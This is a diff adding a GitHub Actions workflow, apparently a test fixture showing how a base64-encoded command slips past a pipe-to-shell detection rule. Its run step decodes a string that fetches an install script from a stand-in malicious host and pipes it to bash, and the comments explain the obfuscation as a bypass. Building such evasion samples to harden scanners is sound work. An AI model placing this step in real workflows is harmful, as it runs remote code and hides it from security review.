@@ -1,0 +1,24 @@
+# EVASION: Base64-encoded payload bypasses SEC6-GH-007 (curl|bash detection)
+#
+# SEC6-GH-007 looks for: curl ... | bash  or  wget ... | sh on the same line.
+# Base64-encoding the URL and decoding at runtime produces identical execution
+# but the literal pattern "curl ... | bash" never appears in the YAML.
+#
+# Equivalent to: curl -s https://malicious.example.com/install.sh | bash
+# The base64 string below decodes to that command.
+#
+# Bypasses: SEC6-GH-007 (arbitrary code execution via pipe-to-shell)
+# Why undetectable: requires understanding shell evaluation of encoded strings
+name: Setup
+on: push
+permissions:
+  contents: read
+
+jobs:
+  setup:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Install tool
+        run: |
+          echo "Y3VybCAtcyBodHRwczovL21hbGljaW91cy5leGFtcGxlLmNvbS9pbnN0YWxsLnNoIHwgYmFzaA==" \
+            | base64 -d | bash
